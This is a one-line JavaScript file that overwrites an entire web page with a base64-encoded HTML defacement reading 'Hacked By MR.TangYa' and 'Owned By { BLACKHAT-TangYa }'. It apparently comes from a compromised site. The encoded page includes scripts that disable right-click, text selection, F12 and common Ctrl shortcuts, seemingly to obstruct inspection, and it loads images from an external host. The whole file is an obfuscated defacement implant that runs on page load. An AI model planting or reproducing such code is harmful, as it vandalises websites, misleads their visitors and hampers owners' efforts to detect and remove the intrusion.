document.documentElement.innerHTML=atob('PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCIgLz4KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wIiAvPgogICAgPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9Ik1SLlBSSU5TIiAvPgogICAgPG1ldGEgbmFtZT0ia2V5d29yZHMiIGNvbnRlbnQ9Ik1SLlBSSU5TIiAvPgogICAgPG1ldGEgbmFtZT0idGl0bGUiIGNvbnRlbnQ9IkhhY2tlZCBCeSBNUi5UYW5nWWEiIC8+CiAgICA8bWV0YSBuYW1lPSJnb29nbGVib3QiIGNvbnRlbnQ9ImluZGV4LCBmb2xsb3ciIC8+CiAgICA8bWV0YSBuYW1lPSJyb2JvdHMiIGNvbnRlbnQ9ImFsbCIgLz4KICAgIDxtZXRhIG5hbWU9InJvYm90cyBzY2hlZHVsZSIgY29udGVudD0iYXV0byIgLz4KICAgIDxtZXRhIG5hbWU9ImRpc3RyaWJ1dGlvbiIgY29udGVudD0iZ2xvYmFsIiAvPgogICAgPHRpdGxlPkhhY2tlZCBCeSBUYW5nWWE8L3RpdGxlPgogICAgPGxpbmsgcmVsPSJpY29uIiBocmVmPSJodHRwczovL25hdGhhbnByaW5zbGV5LWZpbGVzLnByaW5zaC5jb20vZGF0YS0xL2ltYWdlcy9OYXRoYW5Qcmluc2xleS1Bbm9ueW1vdXNMb2dvLnBuZyIgLz4KICAgIDxzdHlsZT4KICAgIEBpbXBvcnQgdXJsKCdodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2NzczI/ZmFtaWx5PUdvbGRtYW4mZGlzcGxheT1zd2FwJyk7CgogICAgYm9keXsKICAgICAgICBtYXJnaW46IDA7CiAgICAgICAgcGFkZGluZzogMDsKICAgICAgICBiYWNrZ3JvdW5kOnVybCgiaHR0cHM6Ly9uYXRoYW5wcmluc2xleS1maWxlcy5wcmluc2guY29tL2RhdGEtMS9pbWFnZXMvTmF0aGFuUHJpbnNsZXktcG9ydF9saXN0ZW5lci5naWYiKSByZXBlYXQgY2VudGVyIGNlbnRlciBmaXhlZCBibGFjazsKICAgICAgICBjb2xvcjogd2hpdGU7CiAgICAgICAgZm9udC1mYW1pbHk6ICdHb2xkbWFuJywgY3Vyc2l2ZTsKICAgIH0KCiAgICBoMXsKICAgICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgICAgICAgZm9udC1zaXplOiA2MHB4OwogICAgICAgIGNvbG9yOiB3aGl0ZTsKICAgICAgICBtYXgtd2lkdGg6MTAwJTsKICAgICAgICBoZWlnaHQ6IGF1dG87CiAgICB9CgogICAgcHsKICAgICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgICAgICAgZm9udC1zaXplOiA0MHB4OwogICAgICAgIGNvbG9yOiB3aGl0ZTsKICAgICAgICBtYXgtd2lkdGg6MTAwJTsKICAgICAgICBoZWlnaHQ6IGF1dG87CiAgICB9CgogICAgcC5mb290ZXJ7CiAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgZm9udC1zaXplOiAyMHB4OwogICAgICBjb2xvcjogd2hpdGU7CiAgICAgIG1heC13aWR0aDogMTAwJTsKICAgICAgaGVpZ2h0OiBhdXRvOwogICAgICBtYXJnaW4tdG9wOiAzLjUlOwogICAgfQoKICAgIGltZ3sKICAgICAgICBtYXgtd2lkdGg6MTAwJTsKICAgICAgICBoZWlnaHQ6IGF1dG87CiAgICAgICAgZGlzcGxheTogYmxvY2s7CiAgICAgICAgbWFyZ2luOiBhdXRvOwogICAgfQoKICAgIEBrZXlmcmFtZXMgc3BpbiB7CiAgICAgIGZyb217CiAgICAgIHRyYW5zZm9ybTogcm90YXRlWSgwZGVnKTsKICAgICAgbW96LXRyYW5zZm9ybTogcm90YXRlWSgwZGVnKTsKICAgICAgbXMtdHJhbnNmb3JtOiByb3RhdGVZKDBkZWcpOwogICAgICB9CiAgICAgIHRvewogICAgICB0cmFuc2Zvcm06IHJvdGF0ZVkoMzYwZGVnKTsKICAgICAgbW96LXRyYW5zZm9ybTogcm90YXRlWSgzNjBkZWcpOwogICAgICBtcy10cmFuc2Zvcm06IHJvdGF0ZVkoMzYwZGVnKTsKICAgICAgfQogICAgfQogICAgQC13ZWJraXQta2V5ZnJhbWVzIHNwaW57CiAgICAgIGZyb217CiAgICAgICAgLXdlYmtpdC10cmFuc2Zvcm06IHJvdGF0ZVkoMGRlZyk7CiAgICAgIH0KICAgIHRvewogICAgICAtd2Via2l0LXRyYW5zZm9ybTogcm90YXRlWSgzNjBkZWcpCiAgICAgIDt9CiAgICB9CgogICAgLmltYWdlU3BpbnsKICAgICAgYW5pbWF0aW9uLW5hbWU6IHNwaW47CiAgICAgIGFuaW1hdGlvbi10aW1pbmctZnVuY3Rpb246IGxpbmVhcjsKICAgICAgYW5pbWF0aW9uLWl0ZXJhdGlvbi1jb3VudDogaW5maW5pdGU7CiAgICAgIGFuaW1hdGlvbi1kdXJhdGlvbjogNXM7CiAgICAgIC13ZWJraXQtYW5pbWF0aW9uLW5hbWU6IHNwaW47CiAgICAgIC13ZWJraXQtYW5pbWF0aW9uLXRpbWluZy1mdW5jdGlvbjogbGluZWFyOwogICAgICAtd2Via2l0LWFuaW1hdGlvbi1pdGVyYXRpb24tY291bnQ6IGluZmluaXRlOwogICAgICAtd2Via2l0LWFuaW1hdGlvbi1kdXJhdGlvbjogNXM7CiAgICB9CgogICAgbWFycXVlZS50ZWFtewogICAgICAgIGJvcmRlcjogUkVEIDNweCBTT0xJRDsKICAgICAgICBjb2xvcjogd2hpdGU7CiAgICAgICAgbWFyZ2luLWxlZnQ6IDIwJTsKICAgICAgICBtYXJnaW4tcmlnaHQ6IDIwJTsKICAgIH0KCiAgICAudGV4dC1ncmFkaWVudHsKICAgICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgICAgICAgYmFja2dyb3VuZDogbGluZWFyLWdyYWRpZW50KHRvIHJpZ2h0LCAjZmZmZmZmIDIwJSwgI0ZGMDAwMCA0MCUsICNGRjAwMDAgNjAlLCAjZmZmZmZmIDgwJSk7CiAgICAgICAgYmFja2dyb3VuZC1zaXplOiAyMDAlIGF1dG87CiAgICAgICAgY29sb3I6ICMwMDA7CiAgICAgICAgYmFja2dyb3VuZC1jbGlwOiB0ZXh0OwogICAgICAgIC13ZWJraXQtYmFja2dyb3VuZC1jbGlwOiB0ZXh0OwogICAgICAgIC13ZWJraXQtdGV4dC1maWxsLWNvbG9yOiB0cmFuc3BhcmVudDsKICAgICAgICBhbmltYXRpb246IGFuaW1hdGUgMS41cyBsaW5lYXIgaW5maW5pdGU7CiAgICB9CiAgICBAa2V5ZnJhbWVzIGFuaW1hdGV7CiAgICAgIHRvIHsKICAgICAgICBiYWNrZ3JvdW5kLXBvc2l0aW9uOiAyMDAlIGNlbnRlcjsKICAgICAgfQogICAgfQogICAgPC9zdHlsZT4KICAgIDxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4KICAgICAgd2luZG93LmFkZEV2ZW50TGlzdGVuZXIoImtleWRvd24iLGZ1bmN0aW9uKGUpe2lmKGUuY3RybEtleSYmKGUud2hpY2g9PTY1fHxlLndoaWNoPT02Nnx8ZS53aGljaD09Njd8fGUud2hpY2g9PTczfHxlLndoaWNoPT04MHx8ZS53aGljaD09ODN8fGUud2hpY2g9PTg1fHxlLndoaWNoPT04Nikpe2UucHJldmVudERlZmF1bHQoKX19KTtkb2N1bWVudC5rZXlwcmVzcz1mdW5jdGlvbihlKXtpZihlLmN0cmxLZXkmJihlLndoaWNoPT02NXx8ZS53aGljaD09NjZ8fGUud2hpY2g9PTY3fHxlLndoaWNoPT03M3x8ZS53aGljaD09ODB8fGUud2hpY2g9PTgzfHxlLndoaWNoPT04NXx8ZS53aGljaD09ODYpKXt9cmV0dXJuIGZhbHNlfQogICAgICBmdW5jdGlvbiBtb3VzZWR3bihlKXt0cnl7aWYoZXZlbnQuYnV0dG9uPT0yfHxldmVudC5idXR0b249PTMpcmV0dXJuIGZhbHNlfWNhdGNoKGUpe2lmKGUud2hpY2g9PTMpcmV0dXJuIGZhbHNlfX1kb2N1bWVudC5vbmNvbnRleHRtZW51PWZ1bmN0aW9uKCl7cmV0dXJuIGZhbHNlfTtkb2N1bWVudC5vbmRyYWdzdGFydD1mdW5jdGlvbigpe3JldHVybiBmYWxzZX07ZG9jdW1lbnQub25tb3VzZWRvd249bW91c2Vkd24KICAgICAgZnVuY3Rpb24gZGlzYWJsZVNlbGVjdGlvbihlKXtpZih0eXBlb2YgZS5vbnNlbGVjdHN0YXJ0IT0idW5kZWZpbmVkIillLm9uc2VsZWN0c3RhcnQ9ZnVuY3Rpb24oKXtyZXR1cm4gZmFsc2V9O2Vsc2UgaWYodHlwZW9mIGUuc3R5bGUuTW96VXNlclNlbGVjdCE9InVuZGVmaW5lZCIpZS5zdHlsZS5Nb3pVc2VyU2VsZWN0PSJub25lIjtlbHNlIGUub25tb3VzZWRvd249ZnVuY3Rpb24oKXtyZXR1cm4gZmFsc2V9O2Uuc3R5bGUuY3Vyc29yPSJkZWZhdWx0In13aW5kb3cub25sb2FkPWZ1bmN0aW9uKCl7ZGlzYWJsZVNlbGVjdGlvbihkb2N1bWVudC5ib2R5KX0KICAgICAgZG9jdW1lbnQub25rZXlkb3duPWZ1bmN0aW9uKGUpe2U9ZXx8d2luZG93LmV2ZW50O2lmKGUua2V5Q29kZT09MTIzfHxlLmtleUNvZGU9PTE4KXtyZXR1cm4gZmFsc2V9fQogICAgPC9zY3JpcHQ+CjwvaGVhZD4KPGJvZHk+CiAgPGRpdiBjbGFzcz0idGV4dC1ncmFkaWVudCI+CiAgICA8aDE+SGFja2VkIEJ5IE1SLlRhbmdZYTwvaDE+PC9kaXY+CiAgPGltZyBzcmM9Imh0dHBzOi8vbmF0aGFucHJpbnNsZXktZmlsZXMucHJpbnNoLmNvbS9kYXRhLTEvaW1hZ2VzL05hdGhhblByaW5zbGV5LUFub255bW91c0xvZ28ucG5nIiBhbHQ9IkhhY2tlciBBbm9ueW1vdXMiIHdpZHRoPSIzMDBweCIgaGVpZ2h0PSIzMDBweCIgY2xhc3M9ImltYWdlU3BpbiIgLz4KICA8cD5Pd25lZCBCeTwvcD4KICA8aDE+eyBCTEFDS0hBVC1UYW5nWWEgfTwvaDE+CiAgPHA+R3JlZXR6PC9wPgogIDxtYXJxdWVlIGNsYXNzPSJ0ZWFtIj5NUi5UYW5nWWEgfCA8YSBocmVmPSIjIj5UYW5nWWE8L2E+ICBDWUJFUlNFQ1VSSVRZIHwgSEFDS0VSPC9tYXJxdWVlPgogIDxwIGNsYXNzPSJmb290ZXIiPkNvcHlyaWdodCAmY29weTsgVGFuZ1lhLiBBbGwgcmlnaHRzIHJlc2VydmVkLjwvcD4KPC9ib2R5Pgo8L2h0bWw+');